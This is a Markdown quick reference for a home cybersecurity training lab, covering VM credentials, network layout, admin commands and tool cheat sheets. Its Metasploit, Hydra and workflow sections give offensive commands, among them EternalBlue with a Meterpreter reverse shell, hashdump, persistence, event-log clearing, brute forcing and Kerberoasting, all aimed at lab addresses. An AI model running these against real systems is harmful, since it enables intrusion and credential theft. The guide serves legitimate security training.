# Quick Reference Guide

**Essential Commands and Configurations for Your Cybersecurity Lab**

---

## Table of Contents

1. [VM Credentials](#vm-credentials)
2. [Network Information](#network-information)
3. [Essential Commands](#essential-commands)
4. [Tool Cheat Sheets](#tool-cheat-sheets)
5. [Common Workflows](#common-workflows)
6. [Troubleshooting Quick Fixes](#troubleshooting-quick-fixes)

---

## VM Credentials

### Default Credentials

| VM | Username | Password | Notes |
|---|---|---|---|
| pfSense | admin | pfsense | Change on first login |
| Kali Linux | kali | (your password) | Set during installation |
| Windows 10/11 | labuser | (your password) | Set during installation |
| Windows Server DC | Administrator | (your password) | Set during installation |
| Domain Users | LABDOMAIN\jdoe | (your password) | Example domain user |
| Metasploitable 2 | msfadmin | msfadmin | DO NOT CHANGE - intentionally weak |

### Important Notes
- 🔒 Change default passwords on production-like systems (pfSense, Windows)
- ⚠️ Keep Metasploitable credentials default (it's meant to be vulnerable)
- 📝 Document all passwords in a secure password manager

---

## Network Information

### Network Segments

| Network | CIDR | Gateway | Purpose |
|---|---|---|---|
| WAN (NAT) | DHCP | Host | Internet access |
| LAN (Internal) | 192.168.1.0/24 | 192.168.1.1 | Internal lab network |
| Host-Only | 192.168.56.0/24 | 192.168.56.2 | Management network |

### Static IP Assignments

| Host | IP Address | Network | Interface |
|---|---|---|---|
| pfSense WAN | DHCP | NAT | em0 |
| pfSense LAN | 192.168.1.1 | Internal | em1 |
| pfSense OPT1 | 192.168.56.2 | Host-Only | em2 |
| Kali Linux | 192.168.56.10 | Host-Only | eth0 |
| Windows Server DC | 192.168.1.10 | Internal | Ethernet |
| Windows Client | 192.168.1.101 | Internal | Ethernet |
| Metasploitable | 192.168.1.50 | Internal | eth0 |

### DNS Configuration

| Server | IP | Purpose |
|---|---|---|
| Primary DNS | 192.168.1.10 | Domain Controller |
| Secondary DNS | 192.168.1.1 | pfSense |
| External DNS | 8.8.8.8 | Google DNS |
| External DNS | 8.8.4.4 | Google DNS |

### Active Directory

- **Domain**: labdomain.local
- **NetBIOS**: LABDOMAIN
- **DC Name**: DC01
- **DC IP**: 192.168.1.10

---

## Essential Commands

### Linux/Kali Commands

#### Network Configuration

```bash
# View IP configuration
ip addr show
ip a

# View routing table
ip route show

# Test connectivity
ping -c 4 192.168.1.1

# DNS lookup
nslookup google.com
dig google.com

# View network connections
ss -tuln
netstat -tuln

# Configure static IP (Debian/Kali)
sudo nano /etc/network/interfaces
# Add:
# auto eth0
# iface eth0 inet static
#     address 192.168.56.10
#     netmask 255.255.255.0
#     gateway 192.168.56.2

# Restart networking
sudo systemctl restart networking
```

#### System Management

```bash
# Update system
sudo apt update
sudo apt full-upgrade -y

# Install package
sudo apt install <package-name> -y

# Remove package
sudo apt remove <package-name>

# Check running services
sudo systemctl status <service-name>

# Start/stop service
sudo systemctl start <service-name>
sudo systemctl stop <service-name>

# View system resources
htop
top
free -h
df -h
```

#### File Operations

```bash
# List files
ls -la

# Change directory
cd /path/to/directory

# Create directory
mkdir directory_name

# Copy file
cp source.txt destination.txt

# Move/rename file
mv old_name.txt new_name.txt

# Delete file
rm file.txt

# Delete directory
rm -rf directory_name

# Find files
find / -name "filename"
locate filename

# View file
cat file.txt
less file.txt
head file.txt
tail file.txt

# Edit file
nano file.txt
vim file.txt
```

### Windows Commands

#### Network Configuration (Command Prompt)

```cmd
# View IP configuration
ipconfig /all

# Release and renew DHCP
ipconfig /release
ipconfig /renew

# Flush DNS cache
ipconfig /flushdns

# Test connectivity
ping 192.168.1.1

# Trace route
tracert 8.8.8.8

# View network connections
netstat -ano

# View routing table
route print
```

#### Network Configuration (PowerShell)

```powershell
# View IP configuration
Get-NetIPConfiguration

# Set static IP
New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.1.101 -PrefixLength 24 -DefaultGateway 192.168.1.1

# Set DNS servers
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 192.168.1.10,192.168.1.1

# Test connectivity
Test-Connection 192.168.1.1

# View network adapters
Get-NetAdapter
```

#### Active Directory (PowerShell)

```powershell
# Import AD module
Import-Module ActiveDirectory

# List all users
Get-ADUser -Filter *

# Get specific user
Get-ADUser -Identity jdoe

# Create new user
New-ADUser -Name "Jane Smith" -GivenName "Jane" -Surname "Smith" -SamAccountName "jsmith" -UserPrincipalName "jsmith@labdomain.local" -Path "OU=Lab Users,DC=labdomain,DC=local" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true

# Add user to group
Add-ADGroupMember -Identity "IT Admins" -Members jsmith

# List all computers
Get-ADComputer -Filter *

# List all groups
Get-ADGroup -Filter *

# Get domain information
Get-ADDomain
```

### pfSense Console Commands

```bash
# Option 1: Assign Interfaces
# Option 2: Set interface(s) IP address
# Option 3: Reset webConfigurator password
# Option 4: Reset to factory defaults
# Option 5: Reboot system
# Option 6: Halt system
# Option 7: Ping host
# Option 8: Shell
# Option 9: pfTop
# Option 10: Filter Logs
# Option 11: Restart webConfigurator
# Option 12: PHP shell + pfSense tools
# Option 13: Update from console
# Option 14: Disable Secure Shell (sshd)
# Option 15: Restore recent configuration
# Option 16: Restart PHP-FPM

# Most common: Option 8 (Shell)
# From shell, you can use standard FreeBSD commands:
ifconfig    # View interfaces
netstat     # Network statistics
pkg         # Package management
tcpdump     # Packet capture
```

---

## Tool Cheat Sheets

### Nmap

#### Basic Scans

```bash
# Ping scan (host discovery)
nmap -sn 192.168.1.0/24

# Quick scan (top 100 ports)
nmap 192.168.1.10

# Full port scan
nmap -p- 192.168.1.10

# Specific ports
nmap -p 22,80,443 192.168.1.10

# Service version detection
nmap -sV 192.168.1.10

# OS detection
nmap -O 192.168.1.10

# Aggressive scan
nmap -A 192.168.1.10

# Default scripts
nmap -sC 192.168.1.10

# Comprehensive scan
nmap -sS -sV -O -sC -p- 192.168.1.10
```

#### Output Options

```bash
# Normal output
nmap 192.168.1.10 -oN output.txt

# XML output
nmap 192.168.1.10 -oX output.xml

# Grepable output
nmap 192.168.1.10 -oG output.gnmap

# All formats
nmap 192.168.1.10 -oA output
```

#### Timing and Performance

```bash
# Timing templates (0=slowest, 5=fastest)
nmap -T4 192.168.1.10

# Parallel host scanning
nmap --min-hostgroup 50 192.168.1.0/24

# Parallel port scanning
nmap --min-parallelism 100 192.168.1.10
```

### Metasploit

#### Basic Commands

```bash
# Start Metasploit
msfconsole

# Update Metasploit
msfupdate

# Database status
db_status

# Initialize database
msfdb init

# Workspace management
workspace                    # List workspaces
workspace -a lab            # Add workspace
workspace lab               # Switch workspace
workspace -d old_workspace  # Delete workspace

# Search
search type:exploit platform:windows smb
search cve:2017 type:exploit

# Use module
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/portscan/tcp

# Show module info
info
show options
show payloads
show targets
show advanced

# Set options
set RHOSTS 192.168.1.101
set RHOST 192.168.1.101
set LHOST 192.168.56.10
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp

# Run exploit
exploit
run

# Background session
background
Ctrl+Z

# Session management
sessions -l              # List sessions
sessions -i 1            # Interact with session 1
sessions -K              # Kill all sessions
sessions -k 1            # Kill session 1
```

#### Meterpreter Commands

```bash
# System information
sysinfo
getuid

# File system
ls
cd C:\\
pwd
download file.txt
upload tool.exe
cat file.txt

# Process management
ps
getpid
migrate <PID>
kill <PID>

# Network
ipconfig
route
netstat

# Privilege escalation
getsystem
getprivs

# Persistence
run persistence -X -i 10 -p 4444 -r 192.168.56.10

# Cleanup
clearev              # Clear event logs
rm file.txt          # Remove files

# Exit
exit
quit
```

### Wireshark

#### Display Filters

```
# Protocol filters
http
https
dns
ftp
ssh
smb
tcp
udp
icmp

# IP filters
ip.addr == 192.168.1.10
ip.src == 192.168.1.10
ip.dst == 192.168.1.10

# Port filters
tcp.port == 80
tcp.port == 443
udp.port == 53

# Logical operators
http and ip.addr == 192.168.1.10
tcp.port == 80 or tcp.port == 443
not arp

# HTTP specific
http.request
http.request.method == GET
http.request.method == POST
http.response.code == 200
http.response.code == 404
http.host contains "example.com"

# Follow streams
# Right-click packet → Follow → TCP/UDP/HTTP Stream
```

#### Capture Filters (BPF Syntax)

```
# Host filters
host 192.168.1.10
src host 192.168.1.10
dst host 192.168.1.10

# Port filters
port 80
portrange 1-1024

# Protocol filters
tcp
udp
icmp

# Combinations
tcp port 80
tcp dst port 443
host 192.168.1.10 and port 22
```

### Burp Suite

#### Proxy Configuration

```
# Burp Proxy Settings:
Listener: 127.0.0.1:8080

# Browser Proxy Settings:
HTTP Proxy: 127.0.0.1
Port: 8080
Use for HTTPS: Yes

# Intercept Rules:
Proxy → Options → Intercept Client Requests
- Match: URL, contains, sensitive-endpoint
- Action: Intercept

# SSL Certificate:
Proxy → Options → Import/Export CA Certificate
Export in DER format for browser import
```

#### Useful Features

```
# Spider:
Target → Right-click domain → Spider this host

# Active Scan:
Target → Right-click → Actively scan this host

# Intruder:
Send to Intruder (Ctrl+I)
Set payload positions: §§
Configure payload type (Simple list, Runtime file, etc.)
Start attack

# Repeater:
Send to Repeater (Ctrl+R)
Modify request
Send (Ctrl+Space or click Go)

# Comparer:
Send to Comparer
Compare multiple requests/responses
```

### OWASP ZAP

```bash
# Start ZAP
zaproxy

# Proxy: localhost:8081

# Spider scan:
# Enter URL → Right-click → Attack → Spider

# Active scan:
# Right-click site → Attack → Active Scan

# Export report:
# Report → Generate HTML Report
```

### OpenVAS/GVM

```bash
# Start services
sudo gvm-start

# Stop services
sudo gvm-stop

# Check setup
sudo gvm-check-setup

# Web interface
# https://localhost:9392
# Username: admin
# Password: (from setup)

# Update feeds
sudo greenbone-feed-sync --type GVMD_DATA
sudo greenbone-feed-sync --type SCAP
sudo greenbone-feed-sync --type CERT
```

### Hydra (Password Cracking)

```bash
# SSH brute force
hydra -l username -P /path/to/wordlist.txt ssh://192.168.1.50

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://192.168.1.50

# HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.50 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# Multiple users and passwords
hydra -L users.txt -P passwords.txt 192.168.1.50 ssh

# Limit attempts (to avoid account lockout)
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.50
```

### John the Ripper

```bash
# Crack password hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Crack with specific format
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Incremental mode (brute force)
john --incremental hashes.txt

# Generate password variations
john --wordlist=words.txt --rules --stdout > variations.txt
```

---

## Common Workflows

### Workflow 1: Network Discovery

```bash
# Step 1: Ping sweep
nmap -sn 192.168.1.0/24 -oN hosts.txt

# Step 2: Port scan discovered hosts
nmap -sV -sC 192.168.1.10,50,101 -oN portscan.txt

# Step 3: Identify OS
nmap -O 192.168.1.10,50,101 -oN os_detection.txt

# Step 4: Detailed service scan
nmap -sV -p- 192.168.1.50 -oN fullscan.txt

# Step 5: Run vulnerability scripts
nmap -sV --script vuln 192.168.1.50 -oN vulnscan.txt
```

### Workflow 2: Web Application Testing

```bash
# Step 1: Start Burp Suite
burpsuite

# Step 2: Configure browser proxy (127.0.0.1:8080)

# Step 3: Browse target application
# Manual exploration, click all links

# Step 4: Spider the application
# Target → Right-click → Spider

# Step 5: Review spider results
# Target → Site map

# Step 6: Active scan
# Target → Right-click → Active Scan

# Step 7: Manual testing
# Send interesting requests to Repeater
# Modify parameters, test for injection

# Step 8: Test with Intruder
# Send to Intruder
# Add payload markers §§
# Load payload list
# Start attack

# Step 9: Analyze results
# Review scanner findings
# Verify manually

# Step 10: Document findings
# Take screenshots
# Export report
```

### Workflow 3: Vulnerability Scanning

```bash
# Step 1: Start OpenVAS
sudo gvm-start

# Step 2: Access web interface
# https://localhost:9392

# Step 3: Create target
# Configuration → Targets → New Target
# Name: Internal Network
# Hosts: 192.168.1.0/24

# Step 4: Create task
# Scans → Tasks → New Task
# Name: Full Network Scan
# Scan Config: Full and fast
# Target: Internal Network

# Step 5: Start scan
# Click start icon

# Step 6: Monitor progress
# Dashboard or Scans → Tasks

# Step 7: Review results
# Wait for completion
# Click on task → Results

# Step 8: Export report
# Scans → Reports
# Select format (PDF, XML, etc.)
# Download
```

### Workflow 4: Active Directory Enumeration

```bash
# From Kali Linux:

# Step 1: Basic enumeration
enum4linux -a 192.168.1.10

# Step 2: SMB enumeration
smbclient -L //192.168.1.10 -U "LABDOMAIN\jdoe"
smbmap -H 192.168.1.10 -u jdoe -p password

# Step 3: RPC enumeration
rpcclient -U "LABDOMAIN\jdoe" 192.168.1.10
> enumdomusers
> enumdomgroups
> queryuser 0x451

# Step 4: LDAP enumeration
ldapsearch -x -h 192.168.1.10 -D "jdoe@labdomain.local" -w password -b "DC=labdomain,DC=local"

# Step 5: Kerberoasting
GetUserSPNs.py LABDOMAIN/jdoe:password -dc-ip 192.168.1.10 -request

# Step 6: BloodHound data collection
bloodhound-python -d labdomain.local -u jdoe -p password -ns 192.168.1.10 -c all

# Step 7: Start BloodHound
neo4j console
bloodhound

# Step 8: Import data and analyze
# Upload JSON files
# Run pre-built queries
# Identify attack paths
```

### Workflow 5: Exploitation with Metasploit

```bash
# Step 1: Start Metasploit
msfconsole

# Step 2: Search for exploit
search ms17-010

# Step 3: Select exploit
use exploit/windows/smb/ms17_010_eternalblue

# Step 4: Show options
show options

# Step 5: Set target
set RHOSTS 192.168.1.101

# Step 6: Set payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Step 7: Set LHOST
set LHOST 192.168.56.10

# Step 8: Check target
check

# Step 9: Exploit
exploit

# Step 10: Post-exploitation (if successful)
sysinfo
getuid
getsystem
hashdump
screenshot
download C:\\Users\\labuser\\Desktop\\file.txt
```

---

## Troubleshooting Quick Fixes

### VM Won't Start

```bash
# Check VirtualBox logs
# VM → Show Log

# Check virtualization is enabled
# Windows: systeminfo | findstr Virtualization
# Linux: egrep -o '(vmx|svm)' /proc/cpuinfo

# Restart VirtualBox
# Close all VMs
# File → Exit VirtualBox
# Restart VirtualBox
```

### No Network Connectivity

```bash
# Linux:
# Check interface status
ip link show

# Bring interface up
sudo ip link set eth0 up

# Request DHCP
sudo dhclient eth0

# Check routes
ip route show

# Windows:
# Check adapter status
ipconfig /all

# Reset adapter
ipconfig /release
ipconfig /renew

# Reset network stack
netsh int ip reset
netsh winsock reset
```

### Can't Access pfSense Web Interface

```bash
# From pfSense console:
# Option 2: Set interface IP addresses
# Verify IP is correct

# From host:
# Ping pfSense
ping 192.168.56.2

# Check firewall (Windows):
# Temporarily disable to test

# Try different browser
# Chrome/Firefox/Edge

# Clear browser cache
# Ctrl+Shift+Del
```

### Domain Join Fails

```powershell
# From Windows Client:

# Check DNS
nslookup labdomain.local

# If DNS fails, set DNS server
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 192.168.1.10

# Test connectivity to DC
Test-Connection 192.168.1.10

# Check time sync
w32tm /query /status

# Sync time with DC
w32tm /resync

# Try join again
Add-Computer -DomainName labdomain.local -Credential LABDOMAIN\Administrator -Restart
```

### Tools Not Working

```bash
# Update Kali
sudo apt update
sudo apt full-upgrade -y

# Reinstall tool
sudo apt remove <tool> --purge
sudo apt install <tool>

# Check service status
sudo systemctl status <service>

# Restart service
sudo systemctl restart <service>

# Check logs
journalctl -xe
tail -f /var/log/syslog
```

### Low Performance

```
# VirtualBox Settings per VM:
1. Increase RAM (if available on host)
2. Increase CPU cores (max = physical cores - 1)
3. Enable 3D Acceleration (Display settings)
4. Increase Video Memory (Display settings)
5. Use VDI dynamically allocated (Storage)
6. Enable I/O APIC (System → Motherboard)

# Host System:
1. Close unnecessary applications
2. Disable antivirus for VM directory (if safe)
3. Ensure good cooling (avoid thermal throttling)
4. Consider RAM upgrade
5. Use SSD for VM storage
```

---

## Quick Tips

### Taking Snapshots

```
Before major changes:
1. Right-click VM → Snapshots
2. Click "Take" icon
3. Name: "Before [action]"
4. Take snapshot

Restore snapshot:
1. Select snapshot
2. Click "Restore"
3. Confirm
```

### Copying Files Between VMs

```bash
# Option 1: Shared folders (with Guest Additions)
# VirtualBox → VM Settings → Shared Folders
# Add folder path from host
# Access in VM: /media/sf_ShareName

# Option 2: Python HTTP server
# On source (Linux):
python3 -m http.server 8000

# On destination:
wget http://192.168.1.10:8000/file.txt

# Option 3: SCP (if SSH enabled)
scp file.txt user@192.168.1.10:/tmp/

# Option 4: SMB share (Windows)
# Share folder on Windows
# Access from Linux: smbclient
```

### Saving Command Output

```bash
# Linux:
command > output.txt          # Overwrite
command >> output.txt         # Append
command 2>&1 | tee output.txt # Both screen and file

# Windows:
command > output.txt          # Overwrite
command >> output.txt         # Append
command | Tee-Object output.txt # PowerShell
```

---

**Quick Reference Version**: 1.0  
**Last Updated**: October 2025  

For detailed explanations, see [SETUP_GUIDE.md](SETUP_GUIDE.md)
